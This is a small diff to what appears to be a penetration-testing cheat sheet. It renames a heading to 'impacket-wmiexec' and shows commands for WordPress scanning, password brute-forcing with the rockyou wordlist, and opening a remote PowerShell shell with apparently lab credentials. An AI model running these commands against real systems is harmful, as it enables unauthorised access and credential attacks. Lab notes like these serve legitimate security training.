@@ -656,7 +656,7 @@ wpscan --url http://$IP/wp/
 wpscan --url http://$IP/wp/wp-login.php -U Admin --passwords /usr/share/wordlists/rockyou.txt --password-attack wp-login
 ```
 
-## wpscan
+## impacket-wmiexec
 
 ```jsx
 impacket-wmiexec -shell-type powershell -dc-ip $IP 'medtech.com/yoshi:Mushroom!@172.16.160.82'
